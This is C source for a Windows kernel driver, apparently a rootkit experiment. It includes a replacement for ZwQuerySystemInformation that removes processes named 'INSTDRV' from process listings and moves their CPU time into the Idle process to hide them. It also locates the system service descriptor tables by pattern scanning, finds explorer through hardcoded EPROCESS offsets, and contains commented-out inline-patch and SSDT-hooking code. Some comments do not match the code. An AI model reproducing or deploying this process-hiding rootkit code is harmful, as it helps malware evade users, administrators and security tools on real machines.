#include "hookssdt.h"
#include "dkomeprocess.h"

NTSTATUS NewZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength)
{

	NTSTATUS ntStatus;
	BOOL curr_is_target = FALSE;

	ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (NT_SUCCESS(ntStatus))
	{
		// Asking for a file and directory listing
		if (SystemInformationClass == 5)
		{
			// This is a query for the process list.
			// Look for process names that start with
			// '_root_' and filter them out.

			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;

			while (curr)
			{
				//Ktrace("Current item is %x\n", curr);
				if (curr->ProcessName.Buffer != NULL)
				{
					if (0 == memcmp(curr->ProcessName.Buffer, L"INSTDRV", 14))
					{
						curr_is_target = TRUE;
						m_UserTime.QuadPart += curr->UserTime.QuadPart;
						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

						if (prev) // Middle or Last entry
						{
							if (curr->NextEntryDelta)
								prev->NextEntryDelta += curr->NextEntryDelta;
							else	// we are last, so make prev the end
								prev->NextEntryDelta = 0;
						}
						else
						{
							if (curr->NextEntryDelta)
							{
								// we are first in the list, so move it forward
								(char *)SystemInformation += curr->NextEntryDelta;
							}
							else // we are the only process!
								SystemInformation = NULL;
						}
					}else {
						curr_is_target = FALSE;
					}
				}
				else // This is the entry for the Idle process
				{
					// Add the kernel and user times of _root_* 
					// processes to the Idle process.
					curr->UserTime.QuadPart += m_UserTime.QuadPart;
					curr->KernelTime.QuadPart += m_KernelTime.QuadPart;

					// Reset the timers for next time we filter
					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
				}
				if (!curr_is_target) {
					prev = curr;
				}
				if (curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
				else curr = NULL;
			}
		}
		else if (SystemInformationClass == 8) // Query for SystemProcessorTimes
		{
			struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
			times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
		}

	}
	return ntStatus;
}

UCHAR kbc_code[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

PEPROCESS GetExplorer()
{
	PLIST_ENTRY list_node = (PLIST_ENTRY)(SYSPROCESS + 0x188);

	PCHAR process_name = "explorer";
	SIZE_T	length = strlen(process_name);
	do {
		if (*(PULONGLONG)((PUCHAR)list_node - 0x188 + 0x170) == 0) {
			PUCHAR image_process_name = (PUCHAR)list_node - 0x188 + 0x2e0;
			if (memcmp(image_process_name, process_name, length) == 0) {
				Ktrace("ROOTKIT: Process : %s Find!\n", image_process_name);
				return (PEPROCESS)((PUCHAR)list_node - 0x188);
			}
		}
		list_node = list_node->Flink;
	} while (SYSPROCESS != (PUCHAR)list_node - 0x188);

	return NULL;
}

NTSTATUS Hp_Onload(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	PUCHAR	pucStartSearchAddress = (PUCHAR)__readmsr(0xC0000082);
	PUCHAR	pucEndSearchAddress = pucStartSearchAddress + SEARCH_RANGE;
	PUCHAR	pdwFindCodeAddress = NULL;
	//ULONG_PTR   SSDT = 0;

	for (; pucStartSearchAddress < pucEndSearchAddress; pucStartSearchAddress++)
	{
		if ((*(PWORD)pucStartSearchAddress & 0xFFFF) == 0x8d4c && (*(PWORD)(pucStartSearchAddress + 7) & 0xFFFF) == 0x8d4c && (*(PWORD)(pucStartSearchAddress + 14) & 0xFFFF) == 0x83f7)
		//if ((*(PWORD)pucStartSearchAddress & 0xFFFF) == 0x8d4c && (*(PWORD)(pucStartSearchAddress + 7) & 0xFFFF) == 0x83f7)
		{
			pdwFindCodeAddress = *(PDWORD)(pucStartSearchAddress + 3) + pucStartSearchAddress + 7;
			KeServiceDescriptorTable = *(PServiceDescriptorTableEntry_t)pdwFindCodeAddress;
			KeServiceDescriptorTableShadow = *(PServiceDescriptorTableEntry_t)(pdwFindCodeAddress + 0x60);
			//SSDT = (ULONG_PTR)pdwFindCodeAddress +
			//	(((*(PDWORD)pdwFindCodeAddress) >> 24) + 7) + //ae
			//	(ULONG_PTR)(((*(PDWORD)(pdwFindCodeAddress + 1)) & 0xFFFF) << 8); //id4c
			//OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));
			//Ktrace("OldZwQuerySystemInformation: %llx", (PULONGLONG)OldZwQuerySystemInformation);
			//PUCHAR function = (PUCHAR)KeServiceDescriptorTableShadow.ServiceTableBase + ((LONG)KeServiceDescriptorTableShadow.ServiceTableBase[1] >> 4);

			//PUCHAR	test2 = (PUCHAR)NewZwQuerySystemInformation;
			break;
		}
	}

	PKAPC_STATE mPtr = ExAllocatePool(NonPagedPool, sizeof(KAPC_STATE));
	KeStackAttachProcess(GetExplorer(), mPtr);
	PHYSICAL_ADDRESS pa1 = MmGetPhysicalAddress((ULONGLONG)(KeServiceDescriptorTableShadow.ServiceTableBase) & 0xfffffffffffff000);
	PHYSICAL_ADDRESS pa2 = MmGetPhysicalAddress(((ULONGLONG)(KeServiceDescriptorTableShadow.ServiceTableBase) & 0xfffffffffffff000) + 0x1000);
	Ktrace("PhysicalAddress1: KeServiceDescriptorTableShadow : %llx \n", pa1.QuadPart);
	Ktrace("PhysicalAddress2: KeServiceDescriptorTableShadow : %llx \n", pa2.QuadPart);
	//PUCHAR function = (PUCHAR)KeServiceDescriptorTableShadow.ServiceTableBase + ((LONG)KeServiceDescriptorTableShadow.ServiceTableBase[1] >> 4);
	KeUnstackDetachProcess(mPtr);

	//KIRQL irql = WPOFFx64();

	////PUCHAR	test2 = (PUCHAR)NewZwQuerySystemInformation;
	//ULONG64 myfun;
	//UCHAR jmp_code[] = "\x48\xB8\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\xFF\xE0";
	//myfun = (ULONGLONG)NewZwQuerySystemInformation;
	//memcpy(jmp_code + 2, &myfun, 8);
	////irql = WPOFFx64();
	//memcpy(kbc_code, ZwQuerySystemInformation, 12);
	////memset(KeBugCheckEx, 0x90, 12);
	//memcpy(ZwQuerySystemInformation, jmp_code, 12);
	////WPONx64(irql);

	//WPONx64(irql);

	//// Initialize global times to zero
	//// These variables will account for the 
	//// missing time our hidden processes are
	//// using.
	//m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

	//// save old system call locations

	//// Map the memory into our domain so we can change the permissions on the MDL
	////g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);
	//g_pmdlSystemCall = IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices * 4, FALSE, FALSE, NULL);
	//if (!g_pmdlSystemCall)
	//	return STATUS_UNSUCCESSFUL;

	//MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

	//// Change the flags of the MDL
	//g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

	////MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
	//MappedSystemCallTable = (PULONG)MmMapLockedPagesSpecifyCache(g_pmdlSystemCall, KernelMode, MmWriteCombined, KeServiceDescriptorTable.ServiceTableBase, FALSE, NormalPagePriority);
	////PUCHAR test5 = (PUCHAR)KeServiceDescriptorTable.ServiceTableBase;
	////PUCHAR test4 = (PUCHAR)MappedSystemCallTable;
	////// hook system calls
	////PUCHAR test1 = ((PUCHAR)KeBugCheckEx - KeServiceDescriptorTable.ServiceTableBase) << 4;
	////ULONG test2 = SYSCALL_INDEX(ZwQuerySystemInformation);
	////PUCHAR test3 = (PUCHAR)&MappedSystemCallTable[SYSCALL_INDEX(ZwQuerySystemInformation)];

	//Ktrace("KeBugCheckEx: %x", (PUCHAR)KeBugCheckEx);

	//HOOK_SYSCALL(ZwQuerySystemInformation, KeBugCheckEx, OldZwQuerySystemInformation);

	//Ktrace("NewZwQuerySystemInformation: %x", SYSTEMSERVICE(ZwQuerySystemInformation));

	return STATUS_SUCCESS;
}

VOID Hp_OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	/*KIRQL irql = WPOFFx64();
	memcpy(ZwQuerySystemInformation, kbc_code, 12);
	WPONx64(irql);*/
	
	//// unhook system calls
	//UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, KeBugCheckEx);

	//// Unlock and Free MDL
	//if (g_pmdlSystemCall)
	//{
	//	MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
	//	IoFreeMdl(g_pmdlSystemCall);
	//}

	return;
}